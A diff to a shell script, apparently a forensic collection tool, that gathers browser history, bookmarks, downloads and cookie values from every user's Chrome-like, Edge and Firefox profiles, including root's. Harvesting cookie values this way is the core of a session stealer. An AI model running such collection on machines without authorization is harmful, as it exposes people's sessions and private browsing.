@@ -36,11 +36,9 @@ RotateLog() {
 }
 
 escape_json() {
-  if command -v python3 >/dev/null 2>&1; then
-    python3 -c "import json,sys; print(json.dumps(sys.stdin.read())[1:-1])"
-  else
-    printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'
-  fi
+  # Escape a single string argument safely for JSON
+  s=$1
+  printf '%s' "$s" | sed 's/\\/\\\\/g; s/"/\\"/g'
 }
 
 RotateLog
@@ -65,9 +63,10 @@ install_sqlite3() {
 query_sqlite() {
   db="$1"
   sql="$2"
-  [ -s "$db" ] || return 0
+  [ -s "$db" ] || { WriteLog "DB missing/empty: $db" DEBUG; return 0; }
   tmpdb="/tmp/$(basename "$db").$$"
-  cp "$db" "$tmpdb" 2>/dev/null || return 0
+  cp "$db" "$tmpdb" 2>/dev/null || { WriteLog "Copy failed, skipping: $db" DEBUG; return 0; }
+  # -json is supported in modern sqlite builds; sed drops a lone 'null'
   result=$(timeout 10 sqlite3 -readonly -json "$tmpdb" "$sql" 2>/dev/null | sed '/^null$/d' || true)
   rm -f "$tmpdb"
   echo "$result"
@@ -78,27 +77,56 @@ collect_chrome_artifacts_all() {
   for home in /home/* /root; do
     [ -d "$home" ] || continue
     user=$(basename "$home")
-    for browser in "google-chrome" "chromium"; do
-      profile_dir="$home/.config/$browser/Default"
-      [ -d "$profile_dir" ] || continue
-      WriteLog "Collecting from $user - $browser" DEBUG
-      out=""
-      history=$(query_sqlite "$profile_dir/History" "SELECT url,title,datetime(last_visit_time/1000000-11644473600,'unixepoch') AS last_visit FROM urls ORDER BY last_visit_time DESC;")
-      [ -n "$history" ] && out="$out\"history\":$history,"
-      if [ -f "$profile_dir/Bookmarks" ]; then
-        bookmarks=$(tr -d '\n\r\000' < "$profile_dir/Bookmarks")
-        bookmarks=$(echo "$bookmarks" | escape_json)
-        [ -n "$bookmarks" ] && out="$out\"bookmarks\":\"$bookmarks\","
-      fi
-      downloads=$(query_sqlite "$profile_dir/History" "SELECT target_path,tab_url,datetime(start_time/1000000-11644473600,'unixepoch') as start_time FROM downloads ORDER BY start_time DESC;")
-      [ -n "$downloads" ] && out="$out\"downloads\":$downloads,"
-      cookies=$(query_sqlite "$profile_dir/Network/Cookies" "SELECT host_key,name,value,datetime(expires_utc/1000000-11644473600,'unixepoch') as expires FROM cookies;")
-      [ -n "$cookies" ] && out="$out\"cookies\":$cookies,"
-      out="${out%,}"
-      [ -n "$out" ] && results="$results,\"$user-$browser\":{$out}"
+
+    # Common base dirs for Chromium-like browsers (native + Snap)
+    for base in \
+      "$home/.config/google-chrome" \
+      "$home/.config/chromium" \
+      "$home/.config/BraveSoftware/Brave-Browser" \
+      "$home/snap/chromium/current/.config/chromium" \
+      "$home/snap/chromium/common/.config/chromium" \
+      "$home/snap/brave/current/.config/BraveSoftware/Brave-Browser" \
+      "$home/.config/vivaldi" \
+      "$home/.config/opera" ; do
+
+      [ -d "$base" ] || continue
+
+      # All profiles, not just Default
+      for profile in "$base"/Default "$base"/Profile*; do
+        [ -d "$profile" ] || continue
+        browser=$(basename "$base")
+        profname=$(basename "$profile")
+        WriteLog "Collecting from $user - $browser - $profname" DEBUG
+
+        out=""
+
+        history=$(query_sqlite "$profile/History" \
+          "SELECT url,title,datetime(last_visit_time/1000000-11644473600,'unixepoch') AS last_visit
+           FROM urls ORDER BY last_visit_time DESC LIMIT 500;")
+        [ -n "$history" ] && out="$out\"history\":$history,"
+
+        if [ -f "$profile/Bookmarks" ]; then
+          bookmarks=$(tr -d '\n\r\000' < "$profile/Bookmarks")
+          bookmarks=$(escape_json "$bookmarks")
+          [ -n "$bookmarks" ] && out="$out\"bookmarks\":\"$bookmarks\","
+        fi
+
+        downloads=$(query_sqlite "$profile/History" \
+          "SELECT target_path,tab_url,datetime(start_time/1000000-11644473600,'unixepoch') AS start_time
+           FROM downloads ORDER BY start_time DESC LIMIT 500;")
+        [ -n "$downloads" ] && out="$out\"downloads\":$downloads,"
+
+        cookies=$(query_sqlite "$profile/Network/Cookies" \
+          "SELECT host_key,name,value,datetime(expires_utc/1000000-11644473600,'unixepoch') AS expires
+           FROM cookies LIMIT 500;")
+        [ -n "$cookies" ] && out="$out\"cookies\":$cookies,"
+
+        out="${out%,}"
+        [ -n "$out" ] && results="$results,\"$user-$browser-$profname\":{$out}"
+      done
     done
   done
-  [ -n "$results" ] && printf '"chrome_chromium":{%s}' "${results#,}"
+  [ -n "$results" ] && printf '"chrome_like":{%s}' "${results#,}"
 }
 
 collect_edge_artifacts_all() {
@@ -106,23 +134,39 @@ collect_edge_artifacts_all() {
   for home in /home/* /root; do
     [ -d "$home" ] || continue
     user=$(basename "$home")
-    profile_dir="$home/.config/microsoft-edge/Default"
-    [ -d "$profile_dir" ] || continue
-    WriteLog "Collecting from $user - edge" DEBUG
-    out=""
-    history=$(query_sqlite "$profile_dir/History" "SELECT url,title,datetime(last_visit_time/1000000-11644473600,'unixepoch') AS last_visit FROM urls ORDER BY last_visit_time DESC;")
-    [ -n "$history" ] && out="$out\"history\":$history,"
-    if [ -f "$profile_dir/Bookmarks" ]; then
-      bookmarks=$(tr -d '\n\r\000' < "$profile_dir/Bookmarks")
-      bookmarks=$(echo "$bookmarks" | escape_json)
-      [ -n "$bookmarks" ] && out="$out\"bookmarks\":\"$bookmarks\","
-    fi
-    downloads=$(query_sqlite "$profile_dir/History" "SELECT target_path,tab_url,datetime(start_time/1000000-11644473600,'unixepoch') as start_time FROM downloads ORDER BY start_time DESC;")
-    [ -n "$downloads" ] && out="$out\"downloads\":$downloads,"
-    cookies=$(query_sqlite "$profile_dir/Network/Cookies" "SELECT host_key,name,value,datetime(expires_utc/1000000-11644473600,'unixepoch') as expires FROM cookies;")
-    [ -n "$cookies" ] && out="$out\"cookies\":$cookies,"
-    out="${out%,}"
-    [ -n "$out" ] && results="$results,\"$user-edge\":{$out}"
+    base="$home/.config/microsoft-edge"
+    [ -d "$base" ] || continue
+
+    for profile in "$base"/Default "$base"/Profile*; do
+      [ -d "$profile" ] || continue
+      profname=$(basename "$profile")
+      WriteLog "Collecting from $user - edge - $profname" DEBUG
+
+      out=""
+      history=$(query_sqlite "$profile/History" \
+        "SELECT url,title,datetime(last_visit_time/1000000-11644473600,'unixepoch') AS last_visit
+         FROM urls ORDER BY last_visit_time DESC LIMIT 500;")
+      [ -n "$history" ] && out="$out\"history\":$history,"
+
+      if [ -f "$profile/Bookmarks" ]; then
+        bookmarks=$(tr -d '\n\r\000' < "$profile/Bookmarks")
+        bookmarks=$(escape_json "$bookmarks")
+        [ -n "$bookmarks" ] && out="$out\"bookmarks\":\"$bookmarks\","
+      fi
+
+      downloads=$(query_sqlite "$profile/History" \
+        "SELECT target_path,tab_url,datetime(start_time/1000000-11644473600,'unixepoch') as start_time
+         FROM downloads ORDER BY start_time DESC LIMIT 500;")
+      [ -n "$downloads" ] && out="$out\"downloads\":$downloads,"
+
+      cookies=$(query_sqlite "$profile/Network/Cookies" \
+        "SELECT host_key,name,value,datetime(expires_utc/1000000-11644473600,'unixepoch') as expires
+         FROM cookies LIMIT 500;")
+      [ -n "$cookies" ] && out="$out\"cookies\":$cookies,"
+
+      out="${out%,}"
+      [ -n "$out" ] && results="$results,\"$user-edge-$profname\":{$out}"
+    done
   done
   [ -n "$results" ] && printf '"edge":{%s}' "${results#,}"
 }
@@ -140,16 +184,30 @@ collect_firefox_artifacts_all() {
       [ -d "$base" ] || continue
       for prof in "$base"/*.default*; do
         [ -d "$prof" ] || continue
-        WriteLog "Collecting from $user - firefox profile $(basename "$prof") [$base]" DEBUG
+        profname=$(basename "$prof")
+        WriteLog "Collecting from $user - firefox profile $profname [$base]" DEBUG
+
         out=""
-        history=$(query_sqlite "$prof/places.sqlite" "SELECT url,title,datetime(last_visit_date/1000000,'unixepoch') as last_visit FROM moz_places ORDER BY last_visit_date DESC;")
+        history=$(query_sqlite "$prof/places.sqlite" \
+          "SELECT url,title,datetime(last_visit_date/1000000,'unixepoch') as last_visit
+           FROM moz_places ORDER BY last_visit_date DESC LIMIT 500;")
         [ -n "$history" ] && out="$out\"history\":$history,"
-        cookies=$(query_sqlite "$prof/cookies.sqlite" "SELECT host,name,value,datetime(expiry,'unixepoch') as expires FROM moz_cookies;")
+
+        cookies=$(query_sqlite "$prof/cookies.sqlite" \
+          "SELECT host,name,value,datetime(expiry,'unixepoch') as expires
+           FROM moz_cookies LIMIT 500;")
         [ -n "$cookies" ] && out="$out\"cookies\":$cookies,"
-        downloads=$(query_sqlite "$prof/downloads.sqlite" "SELECT name,source,datetime(endTime/1000000,'unixepoch') as end_time FROM moz_downloads;")
-        [ -n "$downloads" ] && out="$out\"downloads\":$downloads,"
+
+        # Some distros use 'downloads.sqlite'; modern ones track via places or different tables.
+        if [ -f "$prof/downloads.sqlite" ]; then
+          downloads=$(query_sqlite "$prof/downloads.sqlite" \
+            "SELECT name,source,datetime(endTime/1000000,'unixepoch') as end_time
+             FROM moz_downloads LIMIT 500;")
+          [ -n "$downloads" ] && out="$out\"downloads\":$downloads,"
+        fi
+
         out="${out%,}"
-        [ -n "$out" ] && results="$results,\"$user-firefox\":{$out}"
+        [ -n "$out" ] && results="$results,\"$user-firefox-$profname\":{$out}"
       done
     done
   done
